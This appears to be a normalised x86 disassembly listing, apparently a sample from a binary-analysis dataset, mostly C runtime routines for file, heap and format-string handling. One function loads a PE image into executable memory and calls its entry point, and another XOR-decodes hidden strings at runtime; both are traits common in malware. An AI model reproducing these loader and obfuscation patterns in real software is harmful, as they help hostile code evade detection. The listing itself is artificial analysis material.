mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_1005ed21
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_10041a88
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_1005df26
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_1005ed96
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
mov edx [ ecx + 0x14 ]
cmp edx 0x8
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
cmp [ ebp + 0x8 ] eax
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ecx + 0x10 ]
lea eax [ eax + ecx * 2 ]
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x4
sub_1005edd4
push 0x4
mov eax sub_10080065
call sub_100097c8
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] 0x1
je r-xdata
push ebx
push eax
mov ecx esi
call sub_10067ef7
mov eax esi
call sub_1004db01
retn 0xc
lea edi [ ecx + 0x8 ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp edx 0x10
jb r-xdata
cmp eax ebx
ja r-xdata
push edi
push [ ebp + 0x10 ]
add ecx eax
push [ ebp + 0xc ]
push ecx
push edx
call sub_10039912
add esp 0x14
cmp eax [ esi + 0x10 ]
jbe r-xdata
push ebx
push eax
mov ecx esi
call sub_10067ef7
mov edx [ esi + 0x14 ]
cmp edx 0x10
jb r-xdata
sub_1005ee60
mov eax esi
push edi
lea edi [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax edi
sar eax 0x1
mov edi eax
mov eax [ ecx + 0x10 ]
push esi
call sub_10039b60
neg eax
sbb eax eax
inc eax
pop edi
retn
sub_1005eea0
push ebp
mov ebp esp
mov eax edx
push esi
lea esi [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax esi
sar eax 0x1
push eax
push edx
call sub_100531b0
pop esi
pop ebp
retn 0x4
sub_1005eed0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080677
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
mov [ ebp - 0x4 ] edi
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
mov esi [ LocalFree@IAT ]
mov [ ebx ] edi
cmp eax edi
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax edi
je r-xdata
push eax
call esi
mov eax [ ebx + 0x14 ]
dec eax
mov [ ebx + 0x8 ] edi
cmp eax 0x5
ja r-xdata
push eax
call esi
mov [ ebx + 0x14 ] edi
mov [ ebp - 0x4 ] 0x3
mov eax [ ebx + 0x3c ]
dec [ eax ]
mov eax [ eax ]
cmp eax edi
jne r-xdata
jmp [ eax * 4 + jump_table_1005f128 ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ebx + 0x34 ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebx + 0x38 ]
cmp ecx edi
je r-xdata
xor eax eax
lea esi [ ebp - 0x18 ]
call sub_10021e80
mov eax esi
push eax
lea edi [ ebx + 0x18 ]
mov [ ebp - 0x4 ] 0x5
call sub_10048a10
mov edi esi
mov [ ebp - 0x4 ] 0x4
call sub_10045ee0
jmp r-xdata
xor eax eax
lea esi [ ebp - 0x18 ]
call sub_10021e80
lea edi [ ebx + 0x20 ]
mov ebx esi
call sub_1005ac10
mov edi esi
call sub_1005bb10
mov ebx [ ebp + 0x8 ]
jmp r-xdata
xor eax eax
lea esi [ ebp - 0x18 ]
call sub_10021e80
lea esi [ ebx + 0x28 ]
lea edi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x6
call sub_100683b0
mov esi edi
mov [ ebp - 0x4 ] 0x4
call sub_10042990
jmp r-xdata
xor eax eax
lea esi [ ebp - 0x18 ]
call sub_10021e80
lea esi [ ebx + 0x30 ]
lea edi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x7
call sub_100683b0
mov esi edi
mov [ ebp - 0x4 ] 0x4
call sub_10042990
jmp r-xdata
xor eax eax
lea esi [ ebp - 0x18 ]
call sub_10021e80
lea esi [ ebx + 0x38 ]
lea edi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x8
call sub_100683b0
mov esi edi
mov [ ebp - 0x4 ] 0x4
call sub_10042990
mov [ ebp - 0x4 ] 0x1
mov eax [ ebx + 0x2c ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebx + 0x30 ]
cmp ecx edi
je r-xdata
mov eax [ ebx + 0x3c ]
mov [ ebx + 0x38 ] edi
cmp eax edi
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
xor edi edi
mov eax [ ebx + 0x24 ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebx + 0x28 ]
cmp ecx edi
je r-xdata
mov eax [ ebx + 0x34 ]
mov [ ebx + 0x30 ] edi
cmp eax edi
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ ebx + 0x3c ] edi
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebx + 0x1c ]
dec [ eax ]
jne r-xdata
mov esi [ ebx + 0x20 ]
cmp esi edi
je r-xdata
mov eax [ ebx + 0x2c ]
mov [ ebx + 0x28 ] edi
cmp eax edi
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ ebx + 0x34 ] edi
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi [ ebx + 0x18 ]
cmp esi edi
je r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebx + 0x20 ] edi
cmp eax edi
je r-xdata
call sub_10021ec0
mov [ ebx + 0x2c ] edi
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebx + 0x1c ]
mov [ ebx + 0x18 ] edi
cmp eax edi
je r-xdata
mov eax esi
call sub_100542e0
push esi
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebx + 0x24 ] edi
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebx + 0x1c ] edi
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1005f140
push esi
mov esi ecx
test [ esi + 0x40 ] 0x1
mov [ esi ] r--data
je r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x14 ]
mov [ edx ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] 0x0
mov ecx esi
pop esi
jmp sub_1005f7e0
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
push ecx
call sub_1006591f
add esp 0x4
sub_1005f1c4
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
dec [ rw-data ]
call [ EncodePointer@IAT ]
mov ecx [ rw-data ]
mov [ ecx * 4 + rw-data ] eax
pop ebp
retn
pop ebp
jmp sub_1001b2a6
sub_1005f1f6
push 0xc
push r--data
call sub_10079bf0
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_100559e6
push 0x1e
call sub_10017abb
push 0xff
call sub_100379d0
push 0x18
call sub_10008102
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_10043f7b
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_10079c35
retn
push edi
call sub_10022b5a
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_10022b5a
pop ecx
call sub_1004fd6f
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1005f2af
mov eax [ ebp - 0x1c ]
sub_1005f2b8
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteFileW@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
pop ebp
retn
push eax
call sub_1005df26
pop ecx
or eax 0xffffffff
pop ebp
retn
test eax eax
je r-xdata
sub_1005f300
push ebp
mov ebp esp
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
cmp [ esi + 0x98 ] 0x0
push edi
jne r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x78 ]
mov ecx [ eax + 0x78 ]
test ecx ecx
jne r-xdata
mov eax [ esi + 0x90 ]
push eax
lea edi [ esi + 0x70 ]
push edi
call sub_10055150
mov ecx [ esi + 0x78 ]
mov eax [ ecx + 0x50 ]
push 0x40
push 0x3000
push eax
push 0x0
mov [ esi + 0x9c ] eax
call [ VirtualAlloc@IAT ]
mov [ esi + 0x98 ] eax
test eax eax
jne r-xdata
mov eax [ esi + 0x8c ]
cmp [ eax + ecx + 0x14 ] 0x2
jae r-xdata
xor eax eax
jmp r-xdata
mov ecx [ edi + 0x8 ]
mov edx [ ecx + 0x50 ]
mov ecx [ edi + 0x1c ]
push edx
push ecx
push eax
call sub_100796a0
mov edx [ esi + 0x98 ]
add esp 0xc
push edx
mov eax edi
call sub_10020580
test eax eax
je r-xdata
lea edx [ ebp - 0x74 ]
mov eax 0x10
call sub_10013830
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
pop edi
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ eax + ecx + 0x1c ]
mov eax [ ecx + eax + 0x4 ]
xor eax eax
jmp r-xdata
mov edi [ esi + 0x98 ]
add edi eax
jne r-xdata
push ebx
mov ebx [ esi + 0x98 ]
mov eax edi
call sub_10045be0
pop ebx
test eax eax
je r-xdata
lea edx [ ebp - 0x74 ]
mov eax 0xa5
call sub_10013830
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
pop edi
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x28 ]
mov eax 0x121
call sub_10013830
lea edx [ ebp - 0x40 ]
mov eax 0x117
call sub_10013830
cmp [ esi + 0x40 ] 0x8
lea eax [ esi + 0x2c ]
jb r-xdata
lea edx [ ebp - 0x74 ]
mov eax 0x10f
call sub_10013830
lea eax [ edi + 0x5 ]
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x78 ]
mov eax [ esi + 0x98 ]
mov edx [ ecx + 0x28 ]
push 0x0
push 0x1
push eax
add edx eax
call edx
lea edx [ ebp - 0x6c ]
mov eax 0xd0
call sub_10013830
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
pop edi
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push eax
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ ebp - 0x7c ]
push ecx
call edi
mov edx [ ebp - 0x78 ]
push edx
push 0x8
mov [ esi + 0x50 ] eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x7c ]
mov edi eax
mov eax [ ebp - 0x78 ]
push eax
push ecx
push edi
call sub_100796a0
mov edx [ ebp - 0x78 ]
mov [ ebp - 0x84 ] edi
add esp 0xc
lea edi [ esi + 0xa0 ]
lea eax [ ebp - 0x84 ]
mov [ ebp - 0x80 ] edx
call sub_10053c70
mov eax [ esi + 0x78 ]
mov eax [ eax + 0x78 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov ecx [ esi + 0x8c ]
cmp [ ecx + eax + 0x14 ] 0x3
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ecx + eax + 0x1c ]
mov edx [ esi + 0x8c ]
mov eax [ ecx + edx + 0x8 ]
mov edx [ esi + 0x98 ]
lea ecx [ ebp - 0x7c ]
push ecx
add edx eax
call edx
mov ecx [ ebp - 0x4 ]
add esp 0x4
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1005f560
push ebp
mov ebp esp
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x10 ]
mov [ ebx ] eax
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
mov [ ecx ] 0x3
mov [ edi ] 0x0
mov [ esi ] 0x0
jbe r-xdata
pop ebx
pop ebp
retn
mov edx [ edx ]
mov al [ edx ]
cmp al 0xd
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
dec [ eax ]
inc [ edx ]
cmp [ eax ] 0x0
ja r-xdata
cmp al 0xa
je r-xdata
mov ebx [ edi ]
movzx eax al
mov al [ eax + r--data ]
xor edx edx
cmp al 0x40
sete dl
inc [ esi ]
movzx eax al
and eax 0x3f
shl ebx 0x6
sub [ ecx ] edx
mov edx [ ecx ]
or eax ebx
cmp [ esi ] 0x4
mov [ edi ] eax
jne r-xdata
test edx edx
mov edx [ ebp + 0x10 ]
mov [ esi ] 0x0
je r-xdata
cmp [ ecx ] 0x1
jbe r-xdata
mov ebx [ edx ]
shr eax 0x10
mov [ ebx ] al
inc ebx
mov [ edx ] ebx
cmp [ ecx ] 0x2
jbe r-xdata
mov eax [ edx ]
mov ebx [ edi ]
shr ebx 0x8
mov [ eax ] bl
inc eax
mov [ edx ] eax
mov eax [ edx ]
mov bl [ edi ]
mov [ eax ] bl
inc eax
mov [ edx ] eax
sub_1005f620
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0x94
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_10019180
mov eax esi
mov esp ebp
pop ebp
retn
sub_1005f650
push ebp
mov ebp esp
sub esp 0xa0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push esi
push edi
mov edi [ rw-data ]
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x6a
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x18 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff99
and edx 0xff
mov [ ebp + eax * 2 - 0x14 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x8 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffcb
and edx 0xff
mov [ ebp + eax * 2 - 0xa0 ] dx
inc eax
cmp eax 0x1e
jb r-xdata
lea ecx [ ebp - 0xa0 ]
xor eax eax
push ecx
lea ecx [ edi + 0xda0 ]
mov edx edi
mov [ ebp - 0x64 ] ax
call sub_10065be0
test eax eax
jne r-xdata
mov esi [ edi + 0xda0 ]
cmp esi [ edi + 0xda4 ]
je r-xdata
mov edx [ edi + 0xda0 ]
cmp edx [ edi + 0xda4 ]
je r-xdata
mov ecx [ r--data ]
xor eax eax
lea ebx [ ebx ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x24
and edx 0xff
mov [ ebp + eax * 2 - 0x60 ] dx
inc eax
cmp eax 0x1d
jb r-xdata
lea ecx [ ebp - 0x60 ]
xor eax eax
push ecx
lea ecx [ edi + 0xdb0 ]
mov edx edi
mov [ ebp - 0x26 ] ax
call sub_10065be0
test eax eax
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov edx esi
lea ecx [ ebp - 0x14 ]
call sub_1004ffa0
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
mov esi [ edi + 0xdb0 ]
cmp esi [ edi + 0xdb4 ]
je r-xdata
mov edx [ edi + 0xdb0 ]
cmp edx [ edi + 0xdb4 ]
je r-xdata
mov ecx [ ebp - 0x4 ]
mov [ edi + 0xdc0 ] 0x1
pop edi
xor ecx ebp
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x24 ]
push eax
mov edx esi
lea ecx [ ebp - 0x14 ]
call sub_1004ffa0
add esi 0x1c
cmp esi [ edi + 0xdb4 ]
jne r-xdata
sub_1005f7e0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi ecx
mov ebx [ esi + 0x38 ]
mov [ ebp - 0x4 ] esi
mov [ esi ] r--data
test ebx ebx
je r-xdata
lea ecx [ esi + 0x4 ]
call sub_1003cdb4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov edi [ ebx ]
test edi edi
je r-xdata
push ebx
call sub_1006591f
add esp 0x4
pop edi
push 0x0
lea ecx [ ebp - 0x8 ]
call sub_100014b7
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x8 ]
not esi
call sub_10050f50
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov esi [ ebp - 0x4 ]
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_1005f860
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
cmp eax ecx
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_10050437
test edi edi
je r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x8
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
mov ecx esi
xor edx edx
mov [ ecx + eax * 2 ] dx
mov ecx [ esi ]
xor edx edx
mov [ ecx + eax * 2 ] dx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub eax edi
add eax eax
push eax
lea eax [ ecx + edi ]
lea eax [ ebx + eax * 2 ]
push eax
lea ecx [ edx + ecx * 2 ]
push ecx
call sub_10078db0
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_1005f8eb
mov edi edi
push ebp
mov ebp esp
sub esp 0x204
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x1e4 ] ecx
lea ecx [ ebp - 0x184 ]
mov [ ebp - 0x1a0 ] eax
mov [ ebp - 0x1b0 ] esi
mov [ ebp - 0x1a8 ] ecx
mov [ ebp - 0x1d8 ] 0x15e
mov [ ebp - 0x1d0 ] edi
mov [ ebp - 0x1f0 ] edi
mov [ ebp - 0x194 ] edi
mov [ ebp - 0x1f4 ] edi
cmp esi edi
jne r-xdata
cmp eax edi
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
push ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10024145
leave
retn
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x204 ]
call sub_1006a508
mov al [ esi ]
mov [ ebp - 0x1a2 ] 0x0
mov [ ebp - 0x18c ] edi
mov [ ebp - 0x1c8 ] edi
test al al
je r-xdata
push eax
call sub_10024583
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x1f8 ] 0x0
je r-xdata
movzx eax al
push eax
call sub_100213ec
pop ecx
test eax eax
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0x1c8 ]
mov eax [ ebp - 0x1fc ]
and [ eax + 0x70 ] 0xfffffffd
mov esi [ ebp - 0x1b0 ]
mov al [ esi ]
cmp al 0x25
jne r-xdata
push [ ebp - 0x1a0 ]
dec [ ebp - 0x18c ]
lea esi [ ebp - 0x18c ]
call sub_1007b799
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007b783
mov ebx eax
movzx eax [ esi ]
inc esi
mov [ ebp - 0x194 ] ebx
mov [ ebp - 0x1b0 ] esi
cmp eax ebx
jne r-xdata
cmp [ esi + 0x1 ] al
je r-xdata
mov esi [ ebp - 0x1b0 ]
push [ ebp - 0x1a0 ]
push eax
call sub_10037c91
pop ecx
pop ecx
pop ebx
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp ebx 0xffffffff
movzx eax bl
push eax
call sub_10012962
pop ecx
test eax eax
je r-xdata
cmp al 0x25
jne r-xdata
xor edi edi
mov [ ebp - 0x1c4 ] edi
mov [ ebp - 0x1d1 ] 0x0
mov [ ebp - 0x1ac ] edi
mov [ ebp - 0x1c0 ] edi
mov [ ebp - 0x19c ] edi
mov [ ebp - 0x1cc ] edi
mov [ ebp - 0x1a3 ] 0x0
mov [ ebp - 0x1a4 ] 0x0
mov [ ebp - 0x196 ] 0x0
mov [ ebp - 0x18d ] 0x0
mov [ ebp - 0x1a1 ] 0x0
mov [ ebp - 0x195 ] 0x0
mov [ ebp - 0x185 ] 0x1
mov [ ebp - 0x1dc ] edi
inc esi
movzx eax [ esi ]
push eax
call sub_100213ec
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x1b0 ] esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x1d0 ] 0x1
jne r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_10037c91
pop ecx
pop ecx
cmp [ ebp - 0x194 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007b783
movzx ecx [ esi ]
inc esi
mov [ ebp - 0x1b0 ] esi
cmp ecx eax
jne r-xdata
cmp [ esi + 0x1 ] al
jne r-xdata
cmp ebx 0x4e
jg r-xdata
mov eax [ ebp - 0x19c ]
inc [ ebp - 0x1c0 ]
imul eax eax 0xa
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x19c ] eax
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
jne r-xdata
push [ ebp - 0x1a8 ]
call sub_10022b5a
pop ecx
cmp [ esi ] 0x25
jne r-xdata
cmp eax 0xffffffff
je r-xdata
dec [ ebp - 0x18c ]
inc esi
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0x18d ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp - 0x1f4 ] 0x1
jne r-xdata
mov eax [ ebp - 0x1c8 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x1b0 ]
cmp [ eax + 0x1 ] 0x6e
jne r-xdata
push [ ebp - 0x1a0 ]
push eax
call sub_10037c91
pop ecx
pop ecx
dec [ ebp - 0x185 ]
dec [ ebp - 0x195 ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
inc esi
movzx ebx [ esi ]
movzx eax bl
push eax
call sub_100318af
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x196 ] 0x0
mov [ ebp - 0x1b0 ] esi
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp [ ebp - 0x1f8 ] 0x0
je r-xdata
cmp [ ebp - 0x1a2 ] al
jne r-xdata
mov esi eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x6c
je r-xdata
cmp ebx 0x77
je r-xdata
inc [ ebp - 0x196 ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x1e4 ]
mov ebx [ eax ]
mov [ ebp - 0x1ec ] eax
add eax 0x4
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
mov ecx [ ebp - 0x1fc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
inc [ ebp - 0x1dc ]
mov esi eax
mov [ ebp - 0x1b8 ] edi
mov [ ebp - 0x1b4 ] edi
jmp r-xdata
inc [ ebp - 0x185 ]
inc [ ebp - 0x195 ]
jmp r-xdata
inc [ ebp - 0x18d ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
movzx edi [ esi ]
or edi 0x20
mov [ ebp - 0x1e8 ] edi
cmp edi 0x6e
je r-xdata
mov al [ esi ]
cmp al 0x53
je r-xdata
cmp [ ebp - 0x195 ] 0x0
mov [ ebp - 0x1bc ] ebx
mov [ ebp - 0x18d ] 0x0
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
mov ecx [ ebp - 0x1c0 ]
test ecx ecx
je r-xdata
cmp edi 0x63
je r-xdata
mov [ ebp - 0x195 ] 0x1
mov [ ebp - 0x195 ] 0xff
cmp al 0x43
jne r-xdata
cmp cl 0x33
jne r-xdata
lea eax [ esi + 0x2 ]
cmp [ eax ] 0x34
jne r-xdata
inc [ ebp - 0x185 ]
jmp r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp [ ebp - 0x19c ] 0x0
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007b783
cmp edi 0x7b
je r-xdata
cmp cl 0x64
je r-xdata
lea eax [ esi + 0x2 ]
cmp [ eax ] 0x32
jne r-xdata
cmp edi 0x6f
jg r-xdata
cmp edi 0x63
je r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
jmp r-xdata
mov ebx [ ebp - 0x1bc ]
mov esi [ ebp - 0x1b0 ]
mov edi [ ebp - 0x1e8 ]
push [ ebp - 0x1a0 ]
lea esi [ ebp - 0x18c ]
call sub_1007b799
pop ecx
jmp r-xdata
cmp cl 0x69
je r-xdata
mov esi eax
jmp r-xdata
mov eax edi
sub eax 0x70
je r-xdata
je r-xdata
mov eax [ ebp - 0x1ec ]
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x1ec ] eax
